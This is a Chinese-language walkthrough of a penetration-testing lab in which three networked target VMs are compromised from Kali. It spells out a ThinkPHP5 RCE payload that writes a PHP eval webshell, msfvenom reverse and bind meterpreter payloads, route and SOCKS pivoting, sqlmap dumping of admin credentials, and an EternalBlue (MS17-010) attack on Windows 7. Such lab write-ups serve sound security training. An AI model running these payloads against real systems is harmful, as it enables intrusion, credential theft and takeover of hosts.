环境配置

环境的下载可以在Teamssix✌的公众号获取

在导入虚拟机之前先设置虚拟机网卡

然后在导入虚拟机

攻击机：kali 配置网卡2

靶机服务器：Centos7 配置2，3网卡

内网主机：Ubuntu配置3，4，网卡

内网主机：Windows7 配置4网卡

然后需要打开宝塔后台页面

把对应的IP改为自己的IP就可以登陆上宝塔后台页面了

点击网站->网站名->把Centos网卡三的IP加里面

Ubuntu也是同样操做

到这里环境搭建完成了

攻击机kali:192.168.1.129

Target1:192.168.1.130 192.168.22.131

Target2:192.168.22.130 192.168.33.128

Target3:192.168.33.33

攻击Target1

1.信息收集

nmap扫描一下Target

发现开放的端口还挺多21，22，80，3306都开着呢

2.获取shell

那就先试试80端口，80端口的漏洞比较多

可以发现是Thinkphp5框架，我们可以随便传参看更详细版本

然后可以找对应的payload进行尝试

/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

出现了phpinfo的页面说明存在漏洞

可以利用工具进行上传木马，得到shell,但是没有找到特别好的工具只能手撸

写马

http://192.168.1.130/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php @eval($_POST[%27f14g%27]);?>

上传成功

木马上传成功之后，用蚁剑连接

在根目录下 有/flag.txt flag{qEa12Nasd1a}

在/www/wwwroot/ThinkPHP/public/flag21sA.txt flag{e2D3aFdasde}

目前已经拿到主机的shell了

3.获取主机权限

然后通过msfvenom生成木马

msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.1.129 lport=2222 -f elf > shell.elf

在kali中配置监听模块

use /exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 192.168.1.129
set lport 2222
run

把刚刚生成的木马shell.elf上传导Target1,并赋予执行权限

chmod 777 shell.elf
./shell.elf

成功拿到meterpreter

这就拿到了Target1的主机权限了

我们可以执行这些命令

例如

因为这是我们搭建的靶机环境不带摄像头，现实中拿到主机权限之后还可以操做主机的摄像头

攻击Target2

1.信息收集

在刚刚我们拿到shell,ifconfig时发现Target1还有另外一个网卡

尝试直接namp扫描这个网段上的主机

发现扫不出来，因为我是用我的kali机器作为攻击机，kali的ip相对于22网段是外网，所以扫不到

但是我们可以用centos的ip打他的内网

先用msf自带的探测网络接口的模块（get_local_subnets）

run get_local_subnets

这里有三个网段，但是ifocnfig有两个，这个122网段应该没啥用

查看路由的模块(autoroute -p)来进一步进行信息探测

路由是指路由器从一个接口上收到数据包，根据数据包的目的地址进行定向并转发到另一个接口的过程，就相当于把我们要传输的数据先传输到该路由，再发往目标，centos上又没有msf，所以可以通过设置路由的方式把我们的请求从centos发出，这样不就可以在kali上访问到centos的ip了吗

所以我们要添加22网段路由，简单理解为我们建立了一个攻击机kali和该网段的隧道

run autoroute -s 192.168.22.0/24
run autoroute -p

2.设置msf代理

msf自带的有一个代理模块auxiliary/server/socks_proxy

然后进入proxychains的配置文件

vim /etc/proxychains.conf

代理设置好之后可以扫描端口试试

proxychains4 nmap -sT -Pn 192.168.22.130

这样扫的太慢了

proxychains4 nmap-T4 192.168.22.130

3.获取shell

可以发现80端口依旧开着，那就先访问80端口，不过浏览器上要配置代理

访问之后在源代码里提示sql注入

直接用sqlmap跑

proxychains4 sqlmap -u "http://192.168.22.130/index.php?r=vul&keyword=1"  --dbs --batch

proxychains4 sqlmap -u "http://192.168.22.130/index.php?r=vul&keyword=1" -D bagecms --tables --batch


proxychains4 sqlmap -u "http://192.168.22.130/index.php?r=vul&keyword=1" -D bagecms -T bage_admin --columns --batch

proxychains4 sqlmap -u "http://192.168.22.130/index.php?r=vul&keyword=1" -D bagecms -T bage_admin -C password,username --dump --batch

这样就拿到了账号和密码

查看robots.txt

访问出现登陆页面里，进行登录

登陆上之后有一个flag

然后找找可以利用的点

找到有文件编辑的地方把一句话木马直接写里面试试

<?php echo "aaa";?>
<?php @eval($_POST['f14g']);?>

然后写入木马的位置是 tag 标签的意思

然后我们找到标签所在位置看是否出现 aaa

蚁剑连接

因为只是靶机搭建的是仅主机模式，在这里可以直接连接，其实是需要通过SocksCap、proxifier类似工具配置代理

这样我们就获取主机的shell

发现它也是两个网卡，说明有可能在33这个c段还存在存活主机

4.获取主机权限

然后同样的操做利用msf生成木马文件

从蚁剑终端可以看出 Target是一个64位LINUX系统

这里需要注意的是木马的shell只能用正向，因为我们是搭建隧道来访问的乌班图，因为我们正常访问是访问不到的，但是它处于内网中也访问不到我们，而且让他通过隧道来找我们是不现实的，所以还是得我们通过隧道去找他，所以只能正向

msfvenom -p linux/x64/meterpreter/bind_tcp lport=1111 -f elf > shell.elf

把生成的木马文件上传到蚁剑中

把生成的木马文件上传到蚁剑中并赋予执行权限

在kali中设置监听

在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。
msf这里也需要走代理 ，就是在用proxychains msfconsole来启动msf

proxychains msfconsole
use /exploit/multi/handler
set payload linux/x64/meterpreter/bind_tcp
set rhost 192.168.22.130
set lport 1111
run

可以看到这个时候我们就拿到了meterpreter

也就获得主机的权限

攻击Target3

1.信息收集

我们在拿到Target2主机shell的时候，发现还存在33的c段

尝试直接namp扫描这个网段上的主机，但是肯定是扫不出来的

同理我们可以利用攻击Target2时候的靶机方法攻击来攻击Target3

先用msf自带的探测网络接口的模块（get_local_subnets）

run get_local_subnets

查看路由的模块(autoroute -p)来进一步进行信息探测,然后添加33路由

run autoroute -s 192.168.33.0/24
run autoroute -p

2.设置msf代理

和攻击Target2设置msf代理的方法一样

3.获取主机权限

用nmap扫描开放的端口

proxychains4 nmap -T4 -Pn 192.168.33.33

可以发现 445和3389端口开放，又是win7系统，直接用经典的永恒之蓝攻击试试

proxychains4 msfconsole
use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/bind_tcp
set RHOST 192.168.33.33
run

直接拿下主机权限

到这儿三台靶机都被拿下，直接打穿，成功闯关

flag的话，我没有单独总结，可以看下teamssix✌的总结https://teamssix.com/191021-213828.html
